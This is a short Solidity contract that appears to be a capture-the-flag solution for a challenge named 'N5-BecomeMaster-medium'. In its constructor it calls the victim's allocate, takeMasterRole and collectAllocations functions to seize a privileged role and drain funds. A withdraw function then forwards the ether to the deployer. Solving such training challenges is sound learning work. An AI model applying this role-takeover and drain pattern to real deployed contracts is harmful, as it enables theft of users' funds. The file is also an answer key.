// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "../N5-BecomeMaster-medium.sol";

contract N5ExploitHack {
    N5BecomeMaster public immutable victim;
    address immutable _owner;

    receive() external payable {}

    constructor(address _N5) {
        victim = N5BecomeMaster(_N5);
        _owner = msg.sender;
        victim.allocate();
        victim.takeMasterRole();
        victim.collectAllocations();
    }

    function withdraw() external {
        require(msg.sender == _owner);
        (bool success, ) = _owner.call{value: address(this).balance}("");
        require(success);
    }
}
